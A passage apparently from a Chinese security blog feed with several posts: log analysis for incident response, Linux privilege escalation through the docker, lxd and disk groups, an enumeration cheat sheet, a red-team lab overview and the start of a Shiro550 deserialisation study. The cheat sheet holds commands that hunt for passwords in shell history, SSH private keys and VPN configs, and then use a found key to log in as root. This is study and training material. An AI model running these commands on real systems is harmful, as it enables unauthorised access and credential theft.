class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645950.png" alt="image-20240709183507195"></p><p>查找登录成功登陆的ip一共爆破了多少次，就查看”Failed password for root”字段，也就是第一个的查询，前面的数字就是登陆次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>后门用户就查”new user”字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 |grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645951.png" alt="image-20240709183835955"></p><p>也可以直接看&#x2F;etc&#x2F;passwd的内容</p><p><img src="http://cdn.clown2024.cn/202407151645952.png" alt="image-20240709183913790"></p><p>后门用户是test2</p><p><strong>来补充一下日志相关的知识</strong></p><p>参考这篇文章：<a href="https://developer.aliyun.com/article/1477704">https://developer.aliyun.com/article/1477704</a></p><p>上面查询的字段是日志的级别信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Invalid user 表示尝试使用了一个不存在的用户登录系统。<br>Failed password 表示为某个用户输入了错误的密码。<br>authentication failure 表示认证失败。<br>Connection closed 表示连接被关闭。<br>Accepted password 表示密码认证成功。<br>new user 或 new group 表示创建了新用户或新用户组。<br>password changed 表示用户密码被更改。<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权-不安全配置项</title>
      <link href="/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/"/>
      <url>/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1><span id="不安全的用户组">不安全的用户组</span></h1><p><strong>disk用户组</strong></p><p>disk用户组是Linux中一个特殊的用户组，组内成员可以对一些块设备(比如硬盘、CD等)进行读写。如果属于disk用户组，就可以打开Linux的内置工具debugfs的交互式命令行，并可以挂载到文件系统来调试文件</p><p>先df命令查看文件系统磁盘信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure><p>假设当前的目录分区为&#x2F;dev&#x2F;sda2，然后debugfs打开交互式命令行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">debugfs /dev/sda2<br></code></pre></td></tr></table></figure><p>这时就可以对文件系统进行调试</p><p><strong>adm用户组</strong></p><p>此组的成员通常拥有读取和写入系统日志文件、查看系统性能指标以及执行其他系统管理任务的权限。可以查看&#x2F;var&#x2F;log下的目录系统敏感日志</p><p><strong>shadow用户组</strong></p><p>&#x2F;etc&#x2F;shadow用于存储用户密码，除了root用户，还有shadow用户组成员也可以查看该文件。</p><p><strong>lxd用户组</strong></p><p>改组成员可以使用Linux容器(LXD)。</p><p>Linux容器是一种轻量级的虚拟化技术，能够在单个Linux系统上运行多个独立的Linux实例。</p><p>用户所属该组时，可以使用lxc命令创建新容器，然后将宿主机的文件系统挂载至容器中，即可查看宿主机的敏感文件等操作</p><p><strong>Docker用户组</strong></p><p>Linux安装完docker之后会创建一个名为docker的用户组。如果属于这个组或者是root用户就可以使用docker命令尝试提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -v /:/mnt -it alpine <span class="hljs-comment">#该命令用于将宿主机的根目录挂载到容器的/mnt目录下</span><br><span class="hljs-comment"># 执行这条命令时，docker检查是否存在alpine镜像，不存在会从docker hub中下载，然后以该镜像作为基础</span><br></code></pre></td></tr></table></figure><p>然后就可以在容器中访问宿主机的系统文件了</p><h1><span id="不安全的读写权限">不安全的读写权限</span></h1>]]></content>
      
      
      <categories>
          
          <category> Linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权-信息搜集</title>
      <link href="/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1><span id="服务器信息枚举">服务器信息枚举</span></h1><p><strong>判断是否虚拟化</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">systemd-detect-virt <span class="hljs-comment">#识别系统运行环境，看是否虚拟化</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511101.png" alt="image-20240625200028837"></p><p><strong>查找当前shell是否处于docker中</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><strong>查看系统信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a <span class="hljs-comment">#可以看到操作系统名称、版本、架构、主机名、内核版本信息等</span><br></code></pre></td></tr></table></figure><p><strong>查看内核版本信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure><p><strong>查看系统架构信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -m<br></code></pre></td></tr></table></figure><p><strong>查看发行版本信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/*-release<br></code></pre></td></tr></table></figure><p><strong>查看系统主机名信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hostname<br><span class="hljs-built_in">uname</span> -n<br></code></pre></td></tr></table></figure><h1><span id="用户信息枚举">用户信息枚举</span></h1><p><strong>查看当前用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><strong>查看当前用户详细信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> <span class="hljs-comment">#包含用户名、用户ID和用户所属组及组ID</span><br></code></pre></td></tr></table></figure><p><strong>查看所有用户信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>查看系统中所有用户组</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/group<br></code></pre></td></tr></table></figure><p><strong>查看id和对应组信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f1 /etc/passwd 2&gt;/dev/null);<span class="hljs-keyword">do</span> <span class="hljs-built_in">id</span> <span class="hljs-variable">$i</span>;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>查看当前登陆到系统的用户信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">w <span class="hljs-comment">#可以输出用户的登录名、所使用的终端、当前正在执行的命令、登陆时间和系统运行时间等信息</span><br></code></pre></td></tr></table></figure><p><strong>查看当前登陆的用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">users</span> <span class="hljs-comment">#仅会列出用户名</span><br></code></pre></td></tr></table></figure><p><strong>历史登陆信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">last<br></code></pre></td></tr></table></figure><p><strong>查找系统中所有超管用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep -v -E <span class="hljs-string">&quot;^#&quot;</span> /etc/passwd 2&gt;/dev/null | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123;print $1&#125;&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h1><span id="环境配置枚举">环境配置枚举</span></h1><ul><li>系统路径：PATH环境变量存储了系统中可执行文件的位置</li><li>用户信息：HOME环境变量存储了用户的家目录路径，USER环境变量存储了用户名</li><li>命令行选项：SHELL环境变量存储了用户的默认Shell程序的路径</li><li>其他信息：LANGUAGE环境变量存储了用户的默认语言环境</li></ul><p>环境变量配置不当可能导致权限提升</p><p><strong>查看系统环境变量</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> 2&gt;/dev/null | grep -v <span class="hljs-string">&#x27;LS_COLORS&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查看可执行文件路径信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><strong>查看用户环境配置文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/profile<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;profile是Linux的一个配置文件，包含了系统级别的配置信息；在启动时被读取，并设置系统的环境变量、用户变量、Shell选项等。profile还可以包含shell脚本用于执行一些初始化和配置工作</p><p><strong>查看可用Shell路径</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shells<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511102.png" alt="image-20240625202026353"></p><h1><span id="网络信息枚举">网络信息枚举</span></h1><p><strong>查看网络接口信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig -a<br>ip addr show<br></code></pre></td></tr></table></figure><p>还可以通过查看IP配置文件来查看网络接口信息</p><ul><li>Ubuntu18之前查看&#x2F;etc&#x2F;network&#x2F;interfaces文件</li><li>Ubuntu18之后查看&#x2F;etc&#x2F;netplan&#x2F;*.yaml</li><li>CentOS 8及之前查看&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-*文件</li><li>CentOS Stream 9查看&#x2F;etc&#x2F;NetworkManager&#x2F;system-connections&#x2F;下的文件</li></ul><p><strong>查看ARP缓存信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp -a<br></code></pre></td></tr></table></figure><p><strong>查看路由信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">route<br></code></pre></td></tr></table></figure><p><strong>查看网络连接信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netstat -antlp 2&gt;/dev/null <span class="hljs-comment">#查看所有网络连接信息</span><br>netstat -ntpl 2&gt;/dev/null <span class="hljs-comment">#查看正在监听的TCP端口</span><br>netstat -nupl 2&gt;/dev/null <span class="hljs-comment">#查看正在监听的UDP端口</span><br></code></pre></td></tr></table></figure><p><strong>查看DNS信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf <span class="hljs-comment">#查看该DNS配置文件，里面保存了本地系统用于域名解析的DNS服务器信息</span><br></code></pre></td></tr></table></figure><h1><span id="系统进程枚举">系统进程枚举</span></h1><p><strong>查看系统进程</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps aux 2&gt;/dev/null<br>ps aux 2&gt;/dev/null | grep <span class="hljs-string">&#x27;root&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#查看以root权限运行的进程</span><br>ps aux 2&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | xargs -r <span class="hljs-built_in">ls</span> -la 2&gt;/dev/null | awk <span class="hljs-string">&#x27;!x[$0]++&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#查看进程所对应的二进制文件及权限信息</span><br></code></pre></td></tr></table></figure><h1><span id="特权访问枚举">特权访问枚举</span></h1><p><strong>查看sudoers文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/sudoers <span class="hljs-comment">#该配置文件用于授权某些用户以超级权限执行特定的命令，默认情况该文件只有root能读取</span><br></code></pre></td></tr></table></figure><p><strong>查看是否可以无密码使用sudo</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> | sudo -S -l -k<br></code></pre></td></tr></table></figure><ul><li>-S表示从标准输入获取密码，也就是上面的空密码</li><li>-l 表示列出当前用户能用的权限</li><li>-k 表示重置时间戳，也就是下次再执行sudo时便需要输入密码</li></ul><h1><span id="cron任务枚举">cron任务枚举</span></h1><p><strong>查看所有cron任务</strong></p><p>列出&#x2F;etc&#x2F;下所有以cron开头的文件的详细信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -la /etc/cron* 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>这是一些可能的文件：</p><ul><li>&#x2F;etc&#x2F;crontab：该文件是cron的主配置文件，用来管理全局定时任务，即对整个系统有效的定时任务，包含任务的时间、命令以及执行此任务的用户。此配置任务还包含：SHELL字段，用来指定运行任务时使用的Shell路径信息；PATH字段，用来指定运行cron作业时使用的环境变量路径的值。</li><li>&#x2F;etc&#x2F;cron.d目录，该目录下也一般存放系统级别的定时任务</li><li>&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.monthly、&#x2F;etc&#x2F;cron.weekly目录下分别指定了每天、每小时、每个月、每周运行一次的脚本。</li></ul><p><strong>所有用户的定时任务</strong></p><p>列举所有用户的定时任务(需要root权限)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd | <span class="hljs-built_in">cut</span> -f1 -d:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;### Crontabs for <span class="hljs-variable">$user</span> ####&quot;</span>; crontab -u <span class="hljs-variable">$user</span> -l; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>查看当前用户的定时任务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><strong>查看其他用户的定时任务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l -u &lt;用户名&gt;<br></code></pre></td></tr></table></figure><h1><span id="软件信息枚举">软件信息枚举</span></h1><p><strong>CentOS查看已安装程序</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum list installed<br></code></pre></td></tr></table></figure><p><strong>Debian、Ubuntu查看已安装程序</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -l<br>apt list<br></code></pre></td></tr></table></figure><h1><span id="文件枚举">文件枚举</span></h1><p><strong>查看系统是否安装了文件传输、Shell反弹、代码编译等工具</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> nc 2&gt;/dev/null;<span class="hljs-built_in">which</span> netcat 2&gt;/dev/null;<span class="hljs-built_in">which</span> wget 2&gt;/dev/null;<span class="hljs-built_in">which</span> nmap 2&gt;/dev/null;<span class="hljs-built_in">which</span> gcc 2&gt;/dev/null;<span class="hljs-built_in">which</span> curl 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>查看系统敏感文件权限</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /etc/passwd 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/group 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/profile 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/shadow 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>查看特殊权限文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#查看SUID权限文件</span><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#查看SGID权限文件</span><br></code></pre></td></tr></table></figure><p><strong>查看可写文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查找不属于当前用户但是当前用户可写的文件(排除/proc/和/sys/目录下的文件)</span><br>find / -writable ! -user `<span class="hljs-built_in">whoami</span>` -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-comment">#另一种方式</span><br>find / -perm -2 -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查看指定扩展名文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name *.bak -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查找关键字文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在当前目录及其子目录中查找扩展名为.php的文件，搜索并列出文件内容包含pass的行，并输出行号</span><br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p><strong>查看历史命令记录文件</strong></p><p>查找可能存在的历史命令记录文件，如Bash历史记录文件、MySQL历史记录文件等等。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al ~/.*_history 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511103.png" alt="image-20240625211315620"></p><p>其中bash_history记录历史命令，我们可能从中获得一些服务的凭据之类的重要信息。</p><p><strong>查看隐藏文件</strong></p><p>比如有些管理员会将难记忆的密码通过隐藏文件的方式保存，我们可以通过bash历史命令文件进行搜索查看并获取一些敏感信息</p><p>这是一个示例查找命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-built_in">cat</span> ~/.bash_history | grep -i passw <span class="hljs-comment">#在历史命令搜索指定字符串</span><br></code></pre></td></tr></table></figure><p><strong>查看配置文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*.ovpn&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null <span class="hljs-comment">#.ovpn是虚拟专用网络的配置文件扩展名，即vpn</span><br></code></pre></td></tr></table></figure><p>查找之后我们就可以去看看里面的文件有什么信息</p><p><strong>查看SSH私钥文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name id_rsa 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>如果能找到的话，我们就可以将该文件复制到kali，然后执行下面命令以root用户登陆目标服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa <span class="hljs-comment">#设置权限</span><br>ssh -i id_rsa root@&lt;目标主机的ip&gt; <span class="hljs-comment">#使用id_rsa文件连接</span><br></code></pre></td></tr></table></figure><h1><span id="信息搜集辅助工具">信息搜集辅助工具</span></h1><p><strong>Metasploit模块</strong></p><p>在Metasoloit的post&#x2F;linux&#x2F;gather&#x2F;文件夹下有很多针对服务器信息搜集的后渗透模块。</p><p><strong>开源脚本搜集信息</strong></p><p>比如LinEnum，它可以获取服务器的各种信息，其实该脚本就是多条命令的集合，也可以自己写。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场二</title>
      <link href="/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
      <url>/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1><span id="环境配置">环境配置</span></h1><p><strong>环境说明</strong></p><p>内网网段：10.10.10.1&#x2F;24</p><p>DMZ网段：192.168.111.1&#x2F;24</p><p>测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）</p><p>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deny all tcp ports：10.10.10.1<br>allow all tcp ports：10.10.10.0/24<br></code></pre></td></tr></table></figure><p><strong>配置信息</strong></p><p><strong>DC</strong></p><p>IP：10.10.10.10 OS：Windows 2012(64)</p><p>应用：AD域</p><p><strong>WEB</strong></p><p>IP1：10.10.10.80 IP2：192.168.111.80 OS：Windows 2008(64)</p><p>应用：Weblogic 10.3.6 MSSQL 2008</p><p><strong>PC</strong></p><p>IP1：10.10.10.201 IP2：192.168.111.201 OS：Windows 7(32)</p><p>应用：</p><p><strong>攻击机</strong></p><p>IP：192.168.111.1 OS：Windows 10(64)</p><p>IP：192.168.111.11 OS：Parrot(64)</p><p><img src="http://cdn.clown2024.cn/202407151453562.png" alt="image-20240622210728382"></p><p><img src="http://cdn.clown2024.cn/202407151453563.png" alt="image-20240622214931742"></p><h1><span id="考点描述">考点描述</span></h1><p>本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</p><ol><li>Bypass UAC</li><li>Windows系统NTLM获取（理论知识：Windows认证）</li><li>Access Token利用（MSSQL利用）</li><li>WMI利用</li><li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li><li>域内信息收集</li><li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li><li>域凭证收集</li><li>后门技术（黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro反序列化</title>
      <link href="/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1><span id="shiro介绍">Shiro介绍</span></h1><p>直接问kimi给出的大致介绍</p><p>Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理等功能。它被设计为易于理解且易于使用，同时提供了强大的安全性。以下是Shiro的一些关键特性：</p><ol><li><strong>认证（Authentication）</strong>：Shiro提供了多种认证方式，包括用户名和密码、OAuth、LDAP等。</li><li><strong>授权（Authorization）</strong>：Shiro允许你定义权限和角色，并根据这些定义来控制用户对资源的访问。</li><li><strong>加密（Cryptography）</strong>：Shiro提供了一套加密工具，可以用于安全地存储和传输数据。</li><li><strong>会话管理（Session Management）</strong>：Shiro可以管理Web和非Web环境中的会话。</li><li><strong>Web支持</strong>：Shiro提供了对Web应用的内置支持，可以轻松集成到Servlet、JSP等Web技术中。</li><li><strong>缓存（Caching）</strong>：Shiro内置了缓存机制，可以提高认证和授权过程的性能。</li><li><strong>企业级安全</strong>：Shiro的设计考虑了企业级应用的需求，提供了灵活的安全策略和集成点。</li><li><strong>易于集成</strong>：Shiro可以轻松集成到现有的Java应用中，无论是大型企业应用还是小型项目。</li><li><strong>可扩展性</strong>：Shiro的架构允许开发者根据需要扩展其功能，例如自定义认证和授权策略。</li><li><strong>社区支持</strong>：作为Apache软件基金会的一部分，Shiro拥有活跃的社区和持续的更新。</li></ol><h1><span id="shrio环境搭建">Shrio环境搭建</span></h1><p>可以直接从github上面将代码clone到本地：<a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p><p>然后切换回1.2.4的版本，该版本就是shiro550的漏洞</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:apache/shiro.git<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p><p><img src="http://cdn.clown2024.cn/202407151444228.png" alt="image-20240611233305207"></p><p>然后配置Tomcat服务器将环境跑起来即可，记得添加一个<strong>samples_web_war</strong>工件</p><p><img src="http://cdn.clown2024.cn/202407151444229.png" alt="image-20240611233723956"></p><p><img src="http://cdn.clown2024.cn/202407151444230.png" alt="image-20240611233734929"></p><p>环境搭建和漏洞分析都可以参考这篇文章：<a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇） (changxia3.com)</a></p><p>怪了过两天这环境突然就出错了</p><p>emmm这里可能需要配置一下<strong>tomcat&#x2F;conf&#x2F;server.xml</strong>文件，不然会报错</p><p><img src="http://cdn.clown2024.cn/202407151444231.png" alt="image-20240613235256764"></p><p>参考这篇文章<a href="https://blog.csdn.net/seeeeeeeeeee/article/details/124724396">https://blog.csdn.net/seeeeeeeeeee/article/details/124724396</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Connector</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8088&quot;</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">URIEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">connectionTimeout</span>=<span class="hljs-string">&quot;20000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">redirectPort</span>=<span class="hljs-string">&quot;8443&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">maxParameterCount</span>=<span class="hljs-string">&quot;1000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedPathChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedQueryChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               /&gt;</span><br></code></pre></td></tr></table></figure><p>说是新版tomcat请求不允许一些特殊字符，这里就放行一些特殊字符，但改了之后谷歌还是不行，edge改成http就可以了</p><p>后来找了半天找一个方法终于能解决了：<a href="https://blog.csdn.net/qq_69576997/article/details/136731424">https://blog.csdn.net/qq_69576997/article/details/136731424</a></p><p>谷歌浏览器url输入：chrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>edge浏览器url输入：edge:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>然后在最后一行的<strong>Delete domain security policies</strong>中输入localhost，点击delete，然后重启tomcat就可以了</p><p><img src="http://cdn.clown2024.cn/202407151444232.png" alt="image-20240614132940906"></p><p>麻了这些环境配置。。。</p><h1><span id="shiro550漏洞">Shiro550漏洞</span></h1><p>Shiro550的漏洞是因为其存在固定key加密的原因</p><h2><span id="寻找固定key">寻找固定key</span></h2><p>我们这里从源码入手找到其固定key</p><p>Shiro在登陆是勾选了rememberMe选项就会设置一个rememberMe的cookie</p><p><img src="http://cdn.clown2024.cn/202407151444233.png" alt="image-20240611234659707"></p><p><img src="http://cdn.clown2024.cn/202407151444234.png" 